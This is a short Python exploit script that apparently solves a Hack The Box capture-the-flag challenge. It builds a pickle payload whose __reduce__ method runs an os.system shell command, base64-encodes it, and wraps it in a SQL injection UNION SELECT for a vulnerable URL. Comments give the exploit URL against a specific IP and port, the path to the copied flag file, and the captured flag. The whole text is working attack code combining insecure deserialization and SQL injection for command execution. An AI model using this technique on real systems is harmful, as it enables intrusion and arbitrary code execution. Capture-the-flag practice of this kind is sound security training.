#!/usr/bin/python

#https://drt.sh/posts/htb-cop/

import sys
import base64
import pickle
import urllib.parse
import requests

class Payload:
	def __reduce__(self):
		import os
		cmd = 'cp flag.txt application/static/'
		return os.system, (cmd,)

if __name__ == "__main__":
	payload = base64.b64encode(pickle.dumps(Payload())).decode()
	payload = f"' UNION SELECT '{payload}' -- "
	payload = requests.utils.requote_uri(payload)
	print(payload)

#http://46.101.14.124:32047/view/'%20UNION%20SELECT%20'gANjcG9zaXgKc3lzdGVtCnEAWB8AAABjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvcQGFcQJScQMu'%20--%20
#http://46.101.14.124:32047/static/flag.txt
#HTB{n0_m0re_p1ckl3_pr0paganda_4u}
